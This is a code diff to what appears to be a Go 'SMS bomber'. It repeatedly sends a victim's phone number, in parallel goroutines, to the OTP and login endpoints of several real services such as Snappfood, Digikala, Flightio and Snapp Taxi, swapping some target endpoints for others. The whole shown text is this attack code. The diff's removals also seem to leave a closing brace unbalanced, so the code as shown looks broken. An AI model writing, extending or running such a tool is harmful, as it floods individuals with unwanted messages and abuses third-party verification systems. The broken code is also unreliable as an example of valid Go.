@@ -108,20 +108,17 @@ func main() {
 	ch := make(chan int)
 
 	for i := 0; i < repeatCount; i++ {
-		go sms("https://3tex.io/api/1/users/validation/mobile", map[string]interface{}{
-			"receptorPhone": phone,
+		go sms("https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=0d436e7f-7345-4ed5-a283-01a8956b5fd4&locale=fa", map[string]interface{}{
+			"callphone": phone,
 		}, ch)
-		go sms("https://deniizshop.com/api/v1/sessions/login_request", map[string]interface{}{
-			"mobile_phone": phone,
+		go sms("https://api.digikala.com/v1/user/authenticate/", map[string]interface{}{
+			"username": phone,
 		}, ch)
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
 		}, ch)
 		go sms("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", map[string]interface{}{
 			"cellphone": phone,
-		}, ch)
-		go sms("https://bck.behtarino.com/api/v1/users/phone_verification/", map[string]interface{}{
-			"phone": phone,
 	}
 
 	for i := 0; i < repeatCount*183; i++ {
